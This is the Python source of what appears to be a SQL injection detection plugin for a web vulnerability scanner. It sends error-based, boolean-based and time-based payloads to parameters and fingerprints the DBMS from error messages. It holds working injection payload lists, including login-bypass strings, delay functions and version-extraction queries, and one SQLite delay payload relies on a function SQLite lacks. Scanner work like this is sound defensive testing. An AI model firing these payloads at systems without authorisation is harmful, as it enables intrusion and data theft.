"""
SQL Injection Detection Plugin.
Detects error-based, boolean-based, and time-based SQL injection vulnerabilities.
"""

import re
import time
from typing import List, Optional, Dict, Any, Tuple
from dataclasses import dataclass

from .base import ActivePlugin, PluginContext, PluginResult, PluginCategory
from scanner.core.engine import HTTPEngine
from scanner.core.request_wrapper import RequestWrapper, HTTPMethod, RequestBuilder
from scanner.core.response_wrapper import ResponseWrapper, ResponseDiff
from scanner.core.utils import Finding, PayloadEncoder, ResponseAnalyzer, RandomUtils
from scanner.core.exceptions import RequestException


@dataclass
class SQLiTestResult:
    """Result of a single SQLi test."""
    vulnerable: bool
    technique: str
    payload: str
    evidence: str
    confidence: float
    dbms: Optional[str] = None
    response: Optional[ResponseWrapper] = None


class SQLiPlugin(ActivePlugin):
    """
    SQL Injection detection plugin.
    
    Features:
    - Error-based detection with DBMS fingerprinting
    - Boolean-based blind detection
    - Time-based blind detection
    - Union-based detection hints
    - Strong false-positive filtering
    - Multiple DBMS support
    """
    
    name = "sqli"
    description = "SQL Injection detection module"
    category = PluginCategory.INJECTION
    author = "Security Team"
    version = "1.0.0"
    default_severity = "critical"
    
    cvss_score = 9.8
    cwe_id = "CWE-89"
    references = [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://cwe.mitre.org/data/definitions/89.html",
        "https://portswigger.net/web-security/sql-injection",
    ]
    
    # Error patterns for different databases
    DBMS_ERRORS = {
        'mysql': [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|matches) your (MySQL|MariaDB) server version",
            r"Unknown column '[^']+' in 'field list'",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[42000\]",
        ],
        'postgresql': [
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+unterminated quoted string",
            r"SQLSTATE\[42601\]",
        ],
        'mssql': [
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"OLE DB.*? SQL Server",
            r"SQL Server.*?Driver",
            r"Warning.*?\W(mssql|sqlsrv)_",
            r"SQLException.*?SQLServer",
            r"Microsoft SQL Native Client error '[^']+'",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"com\.microsoft\.sqlserver\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
        ],
        'oracle': [
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?\W(oci|ora)_",
            r"quoted string not properly terminated",
            r"oracle\.jdbc\.driver",
            r"OracleException",
        ],
        'sqlite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*?\W(sqlite_|SQLite3::)",
            r"SQLITE_ERROR",
            r"\[SQLITE_ERROR\]",
            r"sqlite3\.OperationalError:",
            r"SQLite error \d+:",
            r"near \".*?\": syntax error",
        ],
        'db2': [
            r"CLI Driver.*?DB2",
            r"DB2 SQL error",
            r"db2_\w+\(",
            r"SQLCODE=-\d+",
            r"com\.ibm\.db2\.jcc",
        ],
        'generic': [
            r"SQLSTATE\[\w+\]",
            r"SQL syntax.*?error",
            r"sql error",
            r"syntax error.*?sql",
            r"database error",
            r"query error",
        ]
    }
    
    # Boolean-based payloads
    BOOLEAN_PAYLOADS = {
        'true_condition': [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "') OR ('1'='1",
            '") OR ("1"="1',
            "' OR 1=1#",
            '" OR 1=1#',
            "1' OR '1'='1",
            '1" OR "1"="1',
            "admin' --",
            "admin'/*",
        ],
        'false_condition': [
            "' AND '1'='2",
            '" AND "1"="2',
            "' AND 1=2--",
            '" AND 1=2--',
            "') AND ('1'='2",
            '") AND ("1"="2',
            "' AND 1=2#",
            '" AND 1=2#',
        ]
    }
    
    # Time-based payloads
    TIME_PAYLOADS = {
        'mysql': [
            "' AND SLEEP({delay})--",
            '" AND SLEEP({delay})--',
            "' AND BENCHMARK({delay}000000,SHA1('test'))--",
            "') AND SLEEP({delay})--",
            "1' AND SLEEP({delay})#",
        ],
        'postgresql': [
            "' AND pg_sleep({delay})--",
            "'; SELECT pg_sleep({delay})--",
            "') AND pg_sleep({delay})--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '0:0:{delay}'--",
            "' AND WAITFOR DELAY '0:0:{delay}'--",
            "') WAITFOR DELAY '0:0:{delay}'--",
        ],
        'oracle': [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            "' AND UTL_INADDR.get_host_name('10.0.0.1')--",
        ],
        'sqlite': [
            "' AND (SELECT {delay} FROM (SELECT SLEEP({delay})))--",
            "' AND randomblob(1000000000/2)--",
        ],
    }
    
    # Error-inducing payloads
    ERROR_PAYLOADS = [
        "'",
        '"',
        "''",
        '""',
        "`",
        "' OR ''='",
        "';",
        "--",
        "' --",
        "') --",
        "1'1",
        "1 AND 1=1",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' HAVING 1=1--",
        "' GROUP BY 1--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ]
    
    def __init__(self, config=None):
        super().__init__(config)
        self.time_delay = 5  # seconds for time-based testing
        self.time_threshold = 4  # minimum delay to consider successful
    
    def run(
        self,
        engine: HTTPEngine,
        target: str,
        context: PluginContext
    ) -> PluginResult:
        """Execute SQL injection scanning."""
        result = self.create_result()
        
        try:
            injection_points = self.get_injection_points(target, context)
            
            for param_name, param_value, location in injection_points:
                if self.should_stop():
                    result.aborted = True
                    result.abort_reason = "Stop requested"
                    break
                
                self.logger.debug(f"Testing SQLi: {param_name} ({location})")
                
                # Get baseline for comparison
                baseline = self._get_baseline_response(
                    engine, target, param_name, param_value, location, context
                )
                
                if not baseline:
                    continue
                
                # Test 1: Error-based SQLi
                error_result = self._test_error_based(
                    engine, target, param_name, param_value,
                    location, context
                )
                
                if error_result and error_result.vulnerable:
                    finding = self._create_finding_from_result(
                        error_result, target, param_name, location
                    )
                    result.add_finding(finding)
                    result.requests_made += 1
                    
                    if self.config.plugins.stop_on_first_finding:
                        return self.postprocess(result)
                    continue
                
                # Test 2: Boolean-based blind SQLi
                boolean_result = self._test_boolean_based(
                    engine, target, param_name, param_value,
                    location, context, baseline
                )
                
                if boolean_result and boolean_result.vulnerable:
                    finding = self._create_finding_from_result(
                        boolean_result, target, param_name, location
                    )
                    result.add_finding(finding)
                    result.requests_made += 1
                    
                    if self.config.plugins.stop_on_first_finding:
                        return self.postprocess(result)
                    continue
                
                # Test 3: Time-based blind SQLi
                time_result = self._test_time_based(
                    engine, target, param_name, param_value,
                    location, context
                )
                
                if time_result and time_result.vulnerable:
                    finding = self._create_finding_from_result(
                        time_result, target, param_name, location
                    )
                    result.add_finding(finding)
                    result.requests_made += 1
        
        except Exception as e:
            result.add_error(f"SQLi scan error: {str(e)}")
            self.logger.error(f"Error during SQLi scan: {e}", exc_info=True)
        
        return self.postprocess(result)
    
    def test_parameter(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> List[Finding]:
        """Test a parameter for SQLi."""
        findings = []
        
        baseline = self._get_baseline_response(
            engine, target, param_name, param_value, location, context
        )
        
        if not baseline:
            return findings
        
        # Test all techniques
        for test_func in [
            self._test_error_based,
            lambda *args: self._test_boolean_based(*args, baseline),
            self._test_time_based,
        ]:
            result = test_func(
                engine, target, param_name, param_value, location, context
            )
            
            if result and result.vulnerable:
                finding = self._create_finding_from_result(
                    result, target, param_name, location
                )
                findings.append(finding)
                
                if self.config.plugins.stop_on_first_finding:
                    break
        
        return findings
    
    def _get_baseline_response(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> Optional[ResponseWrapper]:
        """Get baseline response for comparison."""
        try:
            request = self._build_request(
                target, param_name, param_value, location, context
            )
            return engine.request(request)
        except RequestException:
            return None
    
    def _build_request(
        self,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> RequestWrapper:
        """Build request with injected parameter."""
        if location == 'url':
            params = dict(context.parameters)
            params[param_name] = param_value
            
            return (
                RequestBuilder(target)
                .params(params)
                .headers(context.headers)
                .cookies(context.cookies)
                .build()
            )
        elif location == 'body':
            body_params = dict(context.body_params)
            body_params[param_name] = param_value
            
            return (
                RequestBuilder(target)
                .post()
                .data(body_params)
                .headers(context.headers)
                .cookies(context.cookies)
                .build()
            )
        else:
            headers = dict(context.headers)
            headers[param_name] = param_value
            
            return (
                RequestBuilder(target)
                .headers(headers)
                .cookies(context.cookies)
                .build()
            )
    
    def _test_error_based(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> Optional[SQLiTestResult]:
        """Test for error-based SQL injection."""
        
        for payload in self.ERROR_PAYLOADS:
            if self.should_stop():
                break
            
            injected_value = f"{param_value}{payload}"
            
            try:
                request = self._build_request(
                    target, param_name, injected_value, location, context
                )
                response = engine.request(request)
                
                # Check for SQL error patterns
                error_match = self._detect_sql_error(response.text)
                
                if error_match:
                    dbms, pattern, matched_text = error_match
                    
                    # Verify it's not a false positive
                    if self._verify_error_based(
                        engine, target, param_name, param_value,
                        location, context, payload
                    ):
                        return SQLiTestResult(
                            vulnerable=True,
                            technique="Error-based",
                            payload=payload,
                            evidence=matched_text,
                            confidence=95.0,
                            dbms=dbms,
                            response=response,
                        )
            
            except RequestException:
                continue
        
        return None
    
    def _detect_sql_error(
        self,
        response_text: str
    ) -> Optional[Tuple[str, str, str]]:
        """Detect SQL error and identify DBMS."""
        for dbms, patterns in self.DBMS_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return (dbms, pattern, match.group(0))
        return None
    
    def _verify_error_based(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext,
        payload: str
    ) -> bool:
        """Verify error-based SQLi is not a false positive."""
        # Send a clean request to ensure error is caused by payload
        try:
            clean_request = self._build_request(
                target, param_name, param_value, location, context
            )
            clean_response = engine.request(clean_request)
            
            # If clean request also shows SQL error, it's likely a false positive
            if self._detect_sql_error(clean_response.text):
                return False
            
            # Also check with safe input
            safe_value = f"{param_value}test123"
            safe_request = self._build_request(
                target, param_name, safe_value, location, context
            )
            safe_response = engine.request(safe_request)
            
            if self._detect_sql_error(safe_response.text):
                return False
            
            return True
        
        except RequestException:
            return True  # If clean request fails, still report the finding
    
    def _test_boolean_based(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext,
        baseline: ResponseWrapper
    ) -> Optional[SQLiTestResult]:
        """Test for boolean-based blind SQL injection."""
        
        true_payloads = self.BOOLEAN_PAYLOADS['true_condition']
        false_payloads = self.BOOLEAN_PAYLOADS['false_condition']
        
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            if self.should_stop():
                break
            
            try:
                # Test true condition
                true_value = f"{param_value}{true_payload}"
                true_request = self._build_request(
                    target, param_name, true_value, location, context
                )
                true_response = engine.request(true_request)
                
                # Test false condition
                false_value = f"{param_value}{false_payload}"
                false_request = self._build_request(
                    target, param_name, false_value, location, context
                )
                false_response = engine.request(false_request)
                
                # Analyze differences
                if self._is_boolean_sqli_confirmed(
                    baseline, true_response, false_response
                ):
                    evidence = self._generate_boolean_evidence(
                        baseline, true_response, false_response,
                        true_payload, false_payload
                    )
                    
                    return SQLiTestResult(
                        vulnerable=True,
                        technique="Boolean-based blind",
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=evidence,
                        confidence=85.0,
                        response=true_response,
                    )
            
            except RequestException:
                continue
        
        return None
    
    def _is_boolean_sqli_confirmed(
        self,
        baseline: ResponseWrapper,
        true_response: ResponseWrapper,
        false_response: ResponseWrapper
    ) -> bool:
        """
        Confirm boolean-based SQLi by analyzing response differences.
        """
        # Check status code differences
        if (
            true_response.status_code == baseline.status_code
            and false_response.status_code != baseline.status_code
        ):
            return True
        
        # Check content length differences
        baseline_len = baseline.content_length
        true_len = true_response.content_length
        false_len = false_response.content_length
        
        # True should be similar to baseline, false should be different
        true_diff = abs(true_len - baseline_len)
        false_diff = abs(false_len - baseline_len)
        
        # Significant difference threshold (10% or 500 bytes)
        threshold = max(baseline_len * 0.1, 500)
        
        if true_diff < threshold and false_diff > threshold:
            return True
        
        # Check for content differences
        # True response should be similar to baseline
        true_similarity = ResponseAnalyzer.calculate_similarity(
            baseline.text, true_response.text
        )
        false_similarity = ResponseAnalyzer.calculate_similarity(
            baseline.text, false_response.text
        )
        
        if true_similarity > 0.9 and false_similarity < 0.7:
            return True
        
        return False
    
    def _generate_boolean_evidence(
        self,
        baseline: ResponseWrapper,
        true_response: ResponseWrapper,
        false_response: ResponseWrapper,
        true_payload: str,
        false_payload: str
    ) -> str:
        """Generate evidence for boolean-based SQLi."""
        evidence_parts = [
            f"Baseline: Status={baseline.status_code}, Length={baseline.content_length}",
            f"TRUE condition ({true_payload}): Status={true_response.status_code}, Length={true_response.content_length}",
            f"FALSE condition ({false_payload}): Status={false_response.status_code}, Length={false_response.content_length}",
        ]
        
        # Calculate differences
        true_diff = abs(true_response.content_length - baseline.content_length)
        false_diff = abs(false_response.content_length - baseline.content_length)
        
        evidence_parts.append(
            f"Length difference - TRUE: {true_diff} bytes, FALSE: {false_diff} bytes"
        )
        
        return "\n".join(evidence_parts)
    
    def _test_time_based(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> Optional[SQLiTestResult]:
        """Test for time-based blind SQL injection."""
        
        # First, establish baseline response time
        baseline_times = []
        for _ in range(3):
            try:
                request = self._build_request(
                    target, param_name, param_value, location, context
                )
                response = engine.request(request)
                baseline_times.append(response.elapsed_time)
            except RequestException:
                pass
        
        if not baseline_times:
            return None
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        # Test time-based payloads for each DBMS
        for dbms, payloads in self.TIME_PAYLOADS.items():
            if self.should_stop():
                break
            
            for payload_template in payloads:
                payload = payload_template.format(delay=self.time_delay)
                injected_value = f"{param_value}{payload}"
                
                try:
                    request = self._build_request(
                        target, param_name, injected_value, location, context
                    )
                    
                    start_time = time.time()
                    response = engine.request(request)
                    elapsed = time.time() - start_time
                    
                    # Check if response was delayed
                    if elapsed >= self.time_threshold:
                        # Verify with a second request
                        verify_start = time.time()
                        verify_response = engine.request(request)
                        verify_elapsed = time.time() - verify_start
                        
                        if verify_elapsed >= self.time_threshold:
                            evidence = (
                                f"Baseline avg response time: {avg_baseline:.2f}s\n"
                                f"Injected response time: {elapsed:.2f}s\n"
                                f"Verification response time: {verify_elapsed:.2f}s\n"
                                f"Expected delay: {self.time_delay}s"
                            )
                            
                            return SQLiTestResult(
                                vulnerable=True,
                                technique="Time-based blind",
                                payload=payload,
                                evidence=evidence,
                                confidence=90.0,
                                dbms=dbms,
                                response=response,
                            )
                
                except RequestException:
                    continue
        
        return None
    
    def _create_finding_from_result(
        self,
        result: SQLiTestResult,
        target: str,
        param_name: str,
        location: str
    ) -> Finding:
        """Create a Finding from SQLi test result."""
        dbms_info = f" ({result.dbms})" if result.dbms else ""
        
        return self.create_finding(
            vulnerability_type=f"SQL Injection - {result.technique}{dbms_info}",
            url=target,
            severity="critical",
            confidence=result.confidence,
            parameter=param_name,
            payload=result.payload,
            evidence=result.evidence,
            description=(
                f"SQL Injection vulnerability detected using {result.technique} "
                f"technique in parameter '{param_name}' (location: {location}). "
                f"{'Identified DBMS: ' + result.dbms if result.dbms else 'DBMS not identified.'}"
            ),
            remediation=(
                "Use parameterized queries (prepared statements) for all database "
                "interactions. Implement input validation using whitelists. "
                "Apply the principle of least privilege for database accounts. "
                "Use an ORM or query builder that automatically escapes input."
            ),
            request_data=result.response.to_dict() if result.response else None,
        )
    
    def get_payloads(self) -> List[str]:
        """Get SQLi payloads from file or defaults."""
        try:
            payloads = self.payload_manager.load('sqli')
            if payloads:
                return payloads
        except Exception:
            pass
        
        return self.ERROR_PAYLOADS